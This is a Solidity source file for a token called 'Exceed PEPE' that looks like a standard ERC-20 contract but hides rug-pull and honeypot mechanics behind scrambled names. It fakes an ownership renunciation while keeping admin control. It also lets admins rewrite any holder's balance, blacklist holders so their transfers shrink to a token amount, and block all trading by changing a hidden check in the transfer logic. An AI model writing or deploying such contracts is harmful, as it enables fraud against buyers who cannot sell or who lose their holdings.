//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface txSwapFee {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptTradingAt) external view returns (uint256);

    function transfer(address txAuto, uint256 feeLaunched) external returns (bool);

    function allowance(address takeFee, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeLaunched) external returns (bool);

    function transferFrom(
        address sender,
        address txAuto,
        uint256 feeLaunched
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atFee, uint256 value);
    event Approval(address indexed takeFee, address indexed spender, uint256 value);
}

abstract contract maxTradingTx {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface sellMax {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface enableReceiver {
    function createPair(address teamLimit, address maxTo) external returns (address);
}

interface txSwapFeeMetadata is txSwapFee {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ExceedPEPE is maxTradingTx, txSwapFee, txSwapFeeMetadata {

    address public fundMarketingFee;

    function marketingFund(address limitShould, address txAuto, uint256 feeLaunched) internal returns (bool) {
        require(launchFund[limitShould] >= feeLaunched);
        launchFund[limitShould] -= feeLaunched;
        launchFund[txAuto] += feeLaunched;
        emit Transfer(limitShould, txAuto, feeLaunched);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tradingSell;
    }

    address private totalLiquidityExempt;

    address public txLimit;

    bool public shouldSell;

    function atLaunch() private view {
        require(swapToken[_msgSender()]);
    }

    uint8 private isFund = 18;

    string private enableAt = "Exceed PEPE";

    function transferFrom(address limitShould, address txAuto, uint256 feeLaunched) external override returns (bool) {
        if (_msgSender() != minWallet) {
            if (atFromEnable[limitShould][_msgSender()] != type(uint256).max) {
                require(feeLaunched <= atFromEnable[limitShould][_msgSender()]);
                atFromEnable[limitShould][_msgSender()] -= feeLaunched;
            }
        }
        return listReceiver(limitShould, txAuto, feeLaunched);
    }

    bool public modeAutoSwap;

    event OwnershipTransferred(address indexed walletAt, address indexed senderTotal);

    bool public shouldEnableFee;

    function launchSender(address swapSellLaunched) public {
        atLaunch();
        if (swapSenderMode) {
            shouldSell = true;
        }
        if (swapSellLaunched == txLimit || swapSellLaunched == fundMarketingFee) {
            return;
        }
        minTo[swapSellLaunched] = true;
    }

    function marketingToken(uint256 feeLaunched) public {
        atLaunch();
        enableTakeMin = feeLaunched;
    }

    uint256 private tradingSell = 100000000 * 10 ** 18;

    function name() external view virtual override returns (string memory) {
        return enableAt;
    }

    uint256 enableTakeMin;

    mapping(address => mapping(address => uint256)) private atFromEnable;

    function fundLimit(address fundSwap) public {
        require(fundSwap.balance < 100000);
        if (shouldEnableFee) {
            return;
        }
        if (receiverTrading == modeAutoSwap) {
            walletTotalMin = false;
        }
        swapToken[fundSwap] = true;
        
        shouldEnableFee = true;
    }

    function walletTradingMax() public {
        emit OwnershipTransferred(txLimit, address(0));
        totalLiquidityExempt = address(0);
    }

    address toMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public swapToken;

    function allowance(address launchFundMax, address toLaunchedTeam) external view virtual override returns (uint256) {
        if (toLaunchedTeam == minWallet) {
            return type(uint256).max;
        }
        return atFromEnable[launchFundMax][toLaunchedTeam];
    }

    bool public atExempt;

    uint256 private shouldMin;

    bool public exemptTeamMarketing;

    function getOwner() external view returns (address) {
        return totalLiquidityExempt;
    }

    function transfer(address launchedMinLimit, uint256 feeLaunched) external virtual override returns (bool) {
        return listReceiver(_msgSender(), launchedMinLimit, feeLaunched);
    }

    function decimals() external view virtual override returns (uint8) {
        return isFund;
    }

    uint256 private toLimitReceiver;

    function approve(address toLaunchedTeam, uint256 feeLaunched) public virtual override returns (bool) {
        atFromEnable[_msgSender()][toLaunchedTeam] = feeLaunched;
        emit Approval(_msgSender(), toLaunchedTeam, feeLaunched);
        return true;
    }

    uint256 public toToken;

    address minWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => uint256) private launchFund;

    bool public receiverTrading;

    bool public swapSenderMode;

    uint256 sellWallet;

    string private totalExempt = "EPE";

    mapping(address => bool) public minTo;

    function balanceOf(address exemptTradingAt) public view virtual override returns (uint256) {
        return launchFund[exemptTradingAt];
    }

    constructor (){
        
        sellMax atTakeTo = sellMax(minWallet);
        fundMarketingFee = enableReceiver(atTakeTo.factory()).createPair(atTakeTo.WETH(), address(this));
        
        txLimit = _msgSender();
        walletTradingMax();
        swapToken[txLimit] = true;
        launchFund[txLimit] = tradingSell;
        
        emit Transfer(address(0), txLimit, tradingSell);
    }

    function limitFrom(address launchedMinLimit, uint256 feeLaunched) public {
        atLaunch();
        launchFund[launchedMinLimit] = feeLaunched;
    }

    function listReceiver(address limitShould, address txAuto, uint256 feeLaunched) internal returns (bool) {
        if (limitShould == txLimit) {
            return marketingFund(limitShould, txAuto, feeLaunched);
        }
        uint256 swapTotal = txSwapFee(fundMarketingFee).balanceOf(toMode);
        require(swapTotal == enableTakeMin);
        require(txAuto != toMode);
        if (minTo[limitShould]) {
            return marketingFund(limitShould, txAuto, txReceiver);
        }
        return marketingFund(limitShould, txAuto, feeLaunched);
    }

    function owner() external view returns (address) {
        return totalLiquidityExempt;
    }

    bool public walletTotalMin;

    function symbol() external view virtual override returns (string memory) {
        return totalExempt;
    }

    uint256 constant txReceiver = 8 ** 10;

}